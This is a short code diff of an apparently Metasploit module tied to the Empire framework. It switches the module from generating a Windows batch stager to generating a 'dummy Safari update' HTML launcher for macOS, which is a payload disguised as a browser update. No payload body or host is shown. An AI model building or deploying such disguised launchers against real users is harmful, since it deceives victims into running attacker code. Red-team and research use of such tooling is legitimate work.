@@ -10,12 +10,12 @@ module MetasploitModule
 
   def initialize(info={})
     super(merge_info(info,
-    'Description'=> 'Creates a Batch File Payload for Empire'
+    'Description'=> 'Generates a dummy Safari update HTML payload launcher for Empire'
     ))
   end
 
-  def stager_generator(empireClient)
-    @stagerCode = empireClient.gen_stager(@listener_name, 'windows/launcher_bat')
+  def stagerGenerator(empireClient)
+    @stagerCode = empireClient.gen_stager(@listener_name, 'osx/safari_launcher')
     return @stagerCode
   end
 end
